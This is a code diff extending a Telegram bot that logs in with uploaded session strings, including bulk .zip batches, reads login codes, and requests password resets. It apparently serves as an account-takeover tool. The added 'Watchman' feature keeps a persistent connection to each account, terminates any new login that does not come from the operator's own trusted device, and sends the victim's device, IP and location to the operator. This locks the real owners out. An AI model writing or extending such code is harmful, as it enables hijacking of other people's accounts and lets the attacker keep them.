@@ -3,6 +3,7 @@ import logging
 import os
 import re
 import tempfile
+import time
 import uuid
 from datetime import datetime, timezone
 
@@ -11,13 +12,17 @@ from aiogram.filters import Command
 from aiogram.types import BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.fsm.storage.memory import MemoryStorage
 
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import ResetPasswordRequest
+from telethon.tl.functions.account import (
+    ResetPasswordRequest,
+    GetAuthorizationsRequest,
+    ResetAuthorizationRequest,
+)
 from telethon.tl.types.account import ResetPasswordOk, ResetPasswordFailedWait, ResetPasswordRequestedWait
 
 import storage
-from config import BOT_TOKEN, OWNER_ID, API_ID, API_HASH
+from config import BOT_TOKEN, OWNER_ID, API_ID, API_HASH, TRUSTED_DEVICE_MODEL
 from session_utils import session_string_from_file, session_string_from_pyrogram_string, extract_zip_sessions
 
 logging.basicConfig(level=logging.INFO)
@@ -29,10 +34,17 @@ dp = Dispatcher(storage=MemoryStorage())
 # Nothing here is ever logged out / destroyed — this bot only ever reads.
 ACCOUNTS = {}
 
-# Which of the two separate entry points ("📤 Read OTP" vs "🔓 Password Reset")
-# the NEXT session upload belongs to. Set only by tapping one of those two
-# buttons — single-owner bot, so a plain global is enough, no FSM needed.
-CURRENT_MODE = "otp"  # "otp" | "reset"
+# Which entry point ("📤 Read OTP" / "🔓 Password Reset" / "🔍 Check Sessions" /
+# "👁️ Watchman") the NEXT session upload belongs to. Set only by tapping one
+# of those buttons — single-owner bot, so a plain global is enough, no FSM.
+CURRENT_MODE = "otp"  # "otp" | "reset" | "sessions" | "watchman"
+
+# Live Watchman clients: entry_id -> {"client": TelegramClient, "burst_task": asyncio.Task | None}
+# Lost on restart — reconnected from storage.get_all_watchmen() in main().
+WATCHMEN_CLIENTS = {}
+
+BURST_WINDOW_SECONDS = 15 * 60
+BURST_CHECK_INTERVAL = 25
 
 # In-memory batch state for the current .zip run (single-owner bot, so one
 # global dict is enough — no multi-user concurrency to worry about).
@@ -113,18 +125,22 @@ async def request_password_reset(session_string: str):
         await client.disconnect()
 
 
-async def login_and_get_phone(session_string: str):
-    """Connects on demand, fetches the phone number, disconnects.
+async def login_and_get_profile(session_string: str):
+    """Connects on demand, fetches phone/user id/username, disconnects.
     Never calls log_out() — a failed/expired session is just reported,
-    never destroyed. Returns (phone, error)."""
+    never destroyed. Returns (profile_dict, error)."""
     client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
     try:
         await client.connect()
         if not await client.is_user_authorized():
             return None, "Session is not authorized (logged out or invalid)."
         me = await client.get_me()
-        phone = f"+{me.phone}" if me.phone else "Unknown"
-        return phone, None
+        profile = {
+            "phone": f"+{me.phone}" if me.phone else "Unknown",
+            "user_id": me.id,
+            "username": f"@{me.username}" if me.username else "None",
+        }
+        return profile, None
     except Exception as e:
         return None, str(e)
     finally:
@@ -135,10 +151,10 @@ async def resolve_and_login_text(raw_text: str, work_dir: str):
     """Tries the pasted text as a Telethon session string first. If login
     fails (e.g. it was actually a Pyrogram string and Telethon can't make
     sense of the bytes), automatically converts it as Pyrogram and retries.
-    Returns (session_string, phone, error)."""
-    phone, error = await login_and_get_phone(raw_text)
+    Returns (session_string, profile_dict, error)."""
+    profile, error = await login_and_get_profile(raw_text)
     if not error:
-        return raw_text, phone, None
+        return raw_text, profile, None
 
     # Fallback: maybe this was a Pyrogram string, not Telethon.
     try:
@@ -146,10 +162,10 @@ async def resolve_and_login_text(raw_text: str, work_dir: str):
     except Exception as conv_err:
         return None, None, f"Not a valid Telethon session ({error}). Tried as Pyrogram too: {conv_err}"
 
-    phone2, error2 = await login_and_get_phone(converted)
+    profile2, error2 = await login_and_get_profile(converted)
     if error2:
         return None, None, f"Converted from Pyrogram format but still couldn't log in: {error2}"
-    return converted, phone2, None
+    return converted, profile2, None
 
 
 # ---------------------------------------------------------------------------
@@ -163,6 +179,8 @@ async def cmd_start(message: types.Message):
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📤 Read OTP", callback_data="mode_otp")],
         [InlineKeyboardButton(text="🔓 Password Reset", callback_data="mode_reset")],
+        [InlineKeyboardButton(text="🔍 Check Sessions", callback_data="mode_sessions")],
+        [InlineKeyboardButton(text="👁️ Watchman", callback_data="mode_watchman")],
     ])
     await message.answer(
         "👋 Welcome!\n\n"
@@ -194,19 +212,70 @@ async def set_mode_reset(callback: types.CallbackQuery):
     await callback.answer()
 
 
+@dp.callback_query(F.data == "mode_sessions")
+async def set_mode_sessions(callback: types.CallbackQuery):
+    if not is_owner(callback.from_user.id):
+        return
+    global CURRENT_MODE
+    CURRENT_MODE = "sessions"
+    await callback.message.edit_text("🔍 Send the session now — as text, a .session file, or a .zip. I'll show its number, user ID, username and logged-in devices.")
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "mode_watchman")
+async def set_mode_watchman(callback: types.CallbackQuery):
+    if not is_owner(callback.from_user.id):
+        return
+    global CURRENT_MODE
+    CURRENT_MODE = "watchman"
+    await callback.message.edit_text("👁️ Send the session now — as text, a .session file, or a .zip. I'll watch it and auto-terminate any new login that isn't from your trusted device.")
+    await callback.answer()
+
+
 # ---------------------------------------------------------------------------
 # Single session string
 # ---------------------------------------------------------------------------
 
-async def process_single_session(message: types.Message, session_string: str, phone: str, status: types.Message):
+async def process_single_session(message: types.Message, session_string: str, profile: dict, status: types.Message):
     """Shared final step once a single session is logged in — branches on
-    CURRENT_MODE to either hand back an OTP-check button, or go straight
-    into requesting a password reset for it."""
+    CURRENT_MODE to send the right follow-up for whichever button started
+    this upload."""
+    phone = profile["phone"]
+
     if CURRENT_MODE == "reset":
         await status.edit_text(f"✅ Logged in — `{phone}`\n\n🔍 Requesting password reset...", parse_mode="Markdown")
         await trigger_reset_and_report(message.chat.id, phone, session_string, status)
         return
 
+    if CURRENT_MODE == "sessions":
+        account_id = gen_account_id()
+        ACCOUNTS[account_id] = {"session": session_string, "phone": phone}
+        text = (
+            f"📱 Phone Number: `{phone}`\n\n"
+            f"🆔 User ID: `{profile['user_id']}`\n\n"
+            f"👤 Username: {profile['username']}"
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="📋 Logged Sessions", callback_data=f"logsess_{account_id}")]
+        ])
+        await status.edit_text(text, parse_mode="Markdown", reply_markup=kb)
+        return
+
+    if CURRENT_MODE == "watchman":
+        entry_id, error = await activate_watchman(session_string, phone)
+        if error:
+            await status.edit_text(f"❌ Could not activate Watchman for `{phone}`.\n\nReason: {error}", parse_mode="Markdown")
+            return
+        await status.edit_text(
+            f"👁️ Watchman activated for `{phone}`.\n\n"
+            f"Any new login (other than your trusted device) will be terminated automatically. "
+            f"Existing sessions are left untouched.",
+            parse_mode="Markdown",
+            reply_markup=watchman_remove_kb(entry_id)
+        )
+        return
+
+    # default: "otp"
     account_id = gen_account_id()
     ACCOUNTS[account_id] = {"session": session_string, "phone": phone}
     await status.edit_text(
@@ -226,12 +295,12 @@ async def handle_session_text(message: types.Message):
 
     status = await message.answer("🔍 Logging in, please wait...")
     work_dir = tempfile.mkdtemp(prefix="otp_session_")
-    session_string, phone, error = await resolve_and_login_text(raw_text, work_dir)
+    session_string, profile, error = await resolve_and_login_text(raw_text, work_dir)
     if error:
         await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
         return
 
-    await process_single_session(message, session_string, phone, status)
+    await process_single_session(message, session_string, profile, status)
 
 
 # ---------------------------------------------------------------------------
@@ -263,18 +332,19 @@ async def handle_session_document(message: types.Message):
             await status.edit_text(f"❌ Session invalid.\n\nReason: {e}")
             return
 
-        phone, error = await login_and_get_phone(session_string)
+        profile, error = await login_and_get_profile(session_string)
         if error:
             await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
             return
 
-        await process_single_session(message, session_string, phone, status)
+        await process_single_session(message, session_string, profile, status)
         return
 
     await message.answer("❌ Unsupported file type. Send a session string, a .session file, or a .zip.")
 
 
 async def handle_zip_upload(message: types.Message, zip_path: str, work_dir: str):
+    mode = CURRENT_MODE
     status = await message.answer("🔍 Reading .zip, please wait...")
     raw_items = extract_zip_sessions(zip_path, work_dir)
     total = len(raw_items)
@@ -282,25 +352,66 @@ async def handle_zip_upload(message: types.Message, zip_path: str, work_dir: str
     items = []
     for item in raw_items:
         if item["error"]:
-            items.append({**item, "phone": None, "status": "invalid"})
+            items.append({**item, "profile": None, "status": "invalid"})
             continue
-        phone, login_error = await login_and_get_phone(item["session"])
+        profile, login_error = await login_and_get_profile(item["session"])
         if login_error:
-            items.append({**item, "phone": None, "status": "login_failed", "error": login_error})
+            items.append({**item, "profile": None, "status": "login_failed", "error": login_error})
         else:
-            items.append({**item, "phone": phone, "status": "ok"})
+            items.append({**item, "profile": profile, "status": "ok"})
 
     valid_count = sum(1 for i in items if i["status"] == "ok")
+    await status.edit_text(f"📦 Found **{total}** session(s) in the zip — **{valid_count}** valid.", parse_mode="Markdown")
 
+    if mode in ("sessions", "watchman"):
+        # These two modes don't paginate — every valid account gets its own
+        # message immediately, one after another, no "Next" button.
+        await process_zip_immediate(message.chat.id, items, mode)
+        return
+
+    # "otp" and "reset" keep the existing one-by-one + Next button flow.
     BATCH["items"] = items
     BATCH["index"] = -1
     BATCH["success"] = 0
     BATCH["failed"] = total - valid_count
     BATCH["active"] = True
-    BATCH["mode"] = CURRENT_MODE  # locks this batch to whichever mode was active at upload time
+    BATCH["mode"] = mode
 
-    await status.edit_text(f"📦 Found **{total}** session(s) in the zip — **{valid_count}** valid.", parse_mode="Markdown")
     await send_next_batch_item(message.chat.id)
+
+
+async def process_zip_immediate(chat_id: int, items: list, mode: str):
+    for item in items:
+        if item["status"] != "ok":
+            continue
+        profile = item["profile"]
+        phone = profile["phone"]
+
+        if mode == "sessions":
+            account_id = gen_account_id()
+            ACCOUNTS[account_id] = {"session": item["session"], "phone": phone}
+            text = (
+                f"📱 Phone Number: `{phone}`\n\n"
+                f"🆔 User ID: `{profile['user_id']}`\n\n"
+                f"👤 Username: {profile['username']}"
+            )
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="📋 Logged Sessions", callback_data=f"logsess_{account_id}")]
+            ])
+            await bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=kb)
+
+        elif mode == "watchman":
+            entry_id, error = await activate_watchman(item["session"], phone)
+            if error:
+                await bot.send_message(chat_id, f"❌ Could not activate Watchman for `{phone}`.\n\nReason: {error}", parse_mode="Markdown")
+                continue
+            await bot.send_message(
+                chat_id,
+                f"👁️ Watchman activated for `{phone}`.\n\n"
+                f"Any new login (other than your trusted device) will be terminated automatically.",
+                parse_mode="Markdown",
+                reply_markup=watchman_remove_kb(entry_id)
+            )
 
 
 async def send_next_batch_item(chat_id: int):
@@ -322,8 +433,9 @@ async def send_next_batch_item(chat_id: int):
         return
 
     item = items[idx]
+    phone = item["profile"]["phone"]
     account_id = gen_account_id()
-    ACCOUNTS[account_id] = {"session": item["session"], "phone": item["phone"]}
+    ACCOUNTS[account_id] = {"session": item["session"], "phone": phone}
     item["account_id"] = account_id
     BATCH["success"] += 1
 
@@ -331,7 +443,7 @@ async def send_next_batch_item(chat_id: int):
     kb = reset_kb(account_id, with_next=has_more) if BATCH.get("mode") == "reset" else otp_kb(account_id, with_next=has_more)
     await bot.send_message(
         chat_id,
-        f"📱 Number: `{item['phone']}`",
+        f"📱 Number: `{phone}`",
         parse_mode="Markdown",
         reply_markup=kb
     )
@@ -387,6 +499,89 @@ async def check_otp_handler(callback: types.CallbackQuery):
     finally:
         # Only disconnects THIS on-demand connection. Never client.log_out() —
         # the account's session must survive a failed check.
+        await client.disconnect()
+
+
+# ---------------------------------------------------------------------------
+# Check Sessions — view an account's profile + its logged-in devices
+# ---------------------------------------------------------------------------
+
+async def build_sessions_list_message(account_id: str, account: dict):
+    """Fetches the account's current logged-in devices and builds the
+    (text, keyboard) for the 'Logged Sessions' message. The device that IS
+    this very lookup connection (marked `current` by Telegram) is listed
+    but never given a Terminate button — terminating it would log the
+    session itself out, which this bot never does."""
+    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
+    try:
+        await client.connect()
+        result = await client(GetAuthorizationsRequest())
+    finally:
+        await client.disconnect()
+
+    lines = [f"📋 Logged Sessions for `{account['phone']}`\n"]
+    kb_rows = []
+    for idx, auth in enumerate(result.authorizations, start=1):
+        device = auth.device_model or "Unknown device"
+        if auth.current:
+            lines.append(f"{idx}. {device} — this lookup connection (not terminable)\n")
+            continue
+        lines.append(
+            f"{idx}. {device}\n"
+            f"   {auth.platform or ''} {auth.system_version or ''}\n"
+            f"   📍 {auth.country or 'Unknown location'}\n"
+            f"   🕒 Last active: {auth.date_active}\n"
+        )
+        kb_rows.append([InlineKeyboardButton(text=f"❌ Terminate: {device}", callback_data=f"termsess_{account_id}_{auth.hash}")])
+
+    kb_rows.append([InlineKeyboardButton(text="🔄 Refresh Sessions", callback_data=f"logsess_{account_id}")])
+    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=kb_rows)
+
+
+@dp.callback_query(F.data.startswith("logsess_"))
+async def logged_sessions_handler(callback: types.CallbackQuery):
+    if not is_owner(callback.from_user.id):
+        return
+    account_id = callback.data.split("_", 1)[1]
+    account = ACCOUNTS.get(account_id)
+    if not account:
+        await callback.answer("❌ This session is no longer available.", show_alert=True)
+        return
+
+    await callback.answer("🔍 Fetching...")
+    try:
+        text, kb = await build_sessions_list_message(account_id, account)
+    except Exception as e:
+        await callback.message.reply(f"❌ Could not fetch sessions.\n\nReason: {e}")
+        return
+
+    # If this came from tapping "Refresh Sessions", edit in place; otherwise
+    # (first tap from the profile message) send a fresh message.
+    if callback.message.text and callback.message.text.startswith("📋 Logged Sessions"):
+        await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=kb)
+    else:
+        await bot.send_message(callback.message.chat.id, text, parse_mode="Markdown", reply_markup=kb)
+
+
+@dp.callback_query(F.data.startswith("termsess_"))
+async def terminate_session_handler(callback: types.CallbackQuery):
+    if not is_owner(callback.from_user.id):
+        return
+    _, account_id, hash_str = callback.data.split("_", 2)
+    account = ACCOUNTS.get(account_id)
+    if not account:
+        await callback.answer("❌ This session is no longer available.", show_alert=True)
+        return
+
+    await callback.answer("🔍 Terminating...")
+    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
+    try:
+        await client.connect()
+        await client(ResetAuthorizationRequest(hash=int(hash_str)))
+        await callback.message.reply("✅ Session terminated.")
+    except Exception as e:
+        await callback.message.reply(f"❌ Could not terminate session.\n\nReason: {e}")
+    finally:
         await client.disconnect()
 
 
@@ -531,14 +726,207 @@ async def reset_watcher():
 
 async def setup_commands():
     await bot.set_my_commands([
-        BotCommand(command="start", description="Start the bot / send a session"),
+        BotCommand(command="start", description="Start the bot / choose a mode"),
         BotCommand(command="pending", description="View pending password-reset requests"),
+        BotCommand(command="watchmenids", description="View active Watchman sessions"),
     ])
+
+
+# ---------------------------------------------------------------------------
+# Watchman — permanent login-guard on an account
+# ---------------------------------------------------------------------------
+
+def watchman_remove_kb(entry_id: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🛑 Remove Watchman", callback_data=f"rmwatch_{entry_id}")]
+    ])
+
+
+async def notify_owner_termination(phone: str, auth) -> None:
+    text = (
+        f"🚨 New login detected and terminated!\n\n"
+        f"📱 Account: `{phone}`\n\n"
+        f"Terminated session details:\n"
+        f"• Device: {auth.device_model or 'Unknown'}\n"
+        f"• Platform: {auth.platform or 'Unknown'} {auth.system_version or ''}\n"
+        f"• App: {auth.app_name or 'Unknown'} {auth.app_version or ''}\n"
+        f"• Location: {auth.country or 'Unknown'}\n"
+        f"• IP: {auth.ip or 'Unknown'}\n"
+        f"• Logged in at: {auth.date_created}"
+    )
+    try:
+        await bot.send_message(OWNER_ID, text, parse_mode="Markdown")
+    except Exception:
+        logging.exception("Could not send Watchman termination alert to owner")
+
+
+async def check_for_new_sessions(entry_id: str) -> None:
+    """One pass: compares the account's current authorizations against the
+    known baseline. A brand-new one is terminated and reported, UNLESS its
+    device model matches TRUSTED_DEVICE_MODEL (that's just the owner
+    logging in themselves) — trusted logins are added to the baseline
+    silently and left alone."""
+    state = WATCHMEN_CLIENTS.get(entry_id)
+    if not state:
+        return
+    entry = storage.get_watchman(entry_id)
+    if not entry:
+        return
+
+    client = state["client"]
+    result = await client(GetAuthorizationsRequest())
+    baseline = set(entry.get("known_hashes", []))
+    newly_terminated = []
+
+    for auth in result.authorizations:
+        if auth.hash in baseline:
+            continue
+        device_model = (auth.device_model or "").strip()
+        if device_model.lower() == TRUSTED_DEVICE_MODEL.strip().lower():
+            baseline.add(auth.hash)
+            continue
+        try:
+            await client(ResetAuthorizationRequest(hash=auth.hash))
+            baseline.add(auth.hash)
+            newly_terminated.append(auth)
+        except Exception:
+            logging.exception(f"Watchman: failed to terminate a new session for {entry_id}")
+
+    storage.update_watchman_known_hashes(entry_id, list(baseline))
+
+    for auth in newly_terminated:
+        await notify_owner_termination(entry["phone"], auth)
+
+
+async def burst_monitor(entry_id: str) -> None:
+    """Runs for BURST_WINDOW_SECONDS after a login-code message is seen,
+    polling every BURST_CHECK_INTERVAL seconds — this covers the gap
+    between the OTP arriving and the person actually finishing login."""
+    end_time = time.monotonic() + BURST_WINDOW_SECONDS
+    try:
+        while time.monotonic() < end_time:
+            try:
+                await check_for_new_sessions(entry_id)
+            except Exception:
+                logging.exception(f"Watchman: burst check failed for {entry_id}")
+            await asyncio.sleep(BURST_CHECK_INTERVAL)
+    finally:
+        state = WATCHMEN_CLIENTS.get(entry_id)
+        if state:
+            state["burst_task"] = None
+
+
+async def trigger_burst(entry_id: str) -> None:
+    state = WATCHMEN_CLIENTS.get(entry_id)
+    if not state:
+        return
+    existing = state.get("burst_task")
+    if existing and not existing.done():
+        existing.cancel()  # a new login-code message restarts the window
+    state["burst_task"] = asyncio.create_task(burst_monitor(entry_id))
+
+
+def _make_watchman_handler(entry_id: str):
+    async def handler(_event):
+        await trigger_burst(entry_id)
+    return handler
+
+
+async def activate_watchman(session_string: str, phone: str):
+    """Connects and stays connected — Watchman is the one feature in this
+    bot that's deliberately NOT on-demand, since it has to be listening at
+    all times to react to a login attempt. Returns (entry_id, error)."""
+    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+    try:
+        await client.connect()
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return None, "Session is not authorized (logged out or invalid)."
+        result = await client(GetAuthorizationsRequest())
+        baseline_hashes = [a.hash for a in result.authorizations]
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        return None, str(e)
+
+    entry_id = f"watch_{uuid.uuid4().hex[:10]}"
+    storage.add_watchman(entry_id, phone, session_string, baseline_hashes)
+
+    client.add_event_handler(_make_watchman_handler(entry_id), events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
+    WATCHMEN_CLIENTS[entry_id] = {"client": client, "burst_task": None}
+    return entry_id, None
+
+
+async def stop_watchman(entry_id: str) -> None:
+    """Removes Watchman for one account. Only ever disconnects the
+    background monitoring connection — never touches the session itself."""
+    state = WATCHMEN_CLIENTS.pop(entry_id, None)
+    if state:
+        burst_task = state.get("burst_task")
+        if burst_task and not burst_task.done():
+            burst_task.cancel()
+        try:
+            await state["client"].disconnect()
+        except Exception:
+            pass
+    storage.remove_watchman(entry_id)
+
+
+@dp.callback_query(F.data.startswith("rmwatch_"))
+async def remove_watchman_handler(callback: types.CallbackQuery):
+    if not is_owner(callback.from_user.id):
+        return
+    entry_id = callback.data.split("_", 1)[1]
+    entry = storage.get_watchman(entry_id)
+    if not entry:
+        await callback.answer("❌ Not found — maybe already removed.", show_alert=True)
+        return
+
+    await callback.answer("🛑 Removing...")
+    phone = entry["phone"]
+    await stop_watchman(entry_id)
+    await callback.message.reply(
+        f"🛑 Watchman removed for `{phone}`.\n\nOnly the background connection was disconnected — the session itself was not touched.",
+        parse_mode="Markdown"
+    )
+
+
+@dp.message(Command("watchmenids"))
+async def cmd_watchmenids(message: types.Message):
+    if not is_owner(message.from_user.id):
+        return
+    all_watchmen = storage.get_all_watchmen()
+    if not all_watchmen:
+        await message.answer("ℹ️ No active Watchman sessions right now.")
+        return
+    for entry_id, entry in all_watchmen.items():
+        await message.answer(f"👁️ `{entry['phone']}`", parse_mode="Markdown", reply_markup=watchman_remove_kb(entry_id))
+
+
+async def restore_watchmen() -> None:
+    """Called once at startup — reconnects every Watchman that was active
+    before the last restart, from the persistent store."""
+    all_watchmen = storage.get_all_watchmen()
+    for entry_id, entry in all_watchmen.items():
+        client = TelegramClient(StringSession(entry["session"]), API_ID, API_HASH)
+        try:
+            await client.connect()
+            if not await client.is_user_authorized():
+                logging.warning(f"Watchman {entry_id} ({entry['phone']}) session no longer authorized — skipping restore.")
+                await client.disconnect()
+                continue
+            client.add_event_handler(_make_watchman_handler(entry_id), events.NewMessage(from_users=TELEGRAM_SERVICE_ID))
+            WATCHMEN_CLIENTS[entry_id] = {"client": client, "burst_task": None}
+        except Exception:
+            logging.exception(f"Could not restore Watchman {entry_id} ({entry.get('phone')})")
 
 
 async def main():
     await setup_commands()
     asyncio.create_task(reset_watcher())
+    await restore_watchmen()
     await dp.start_polling(bot)
 
 
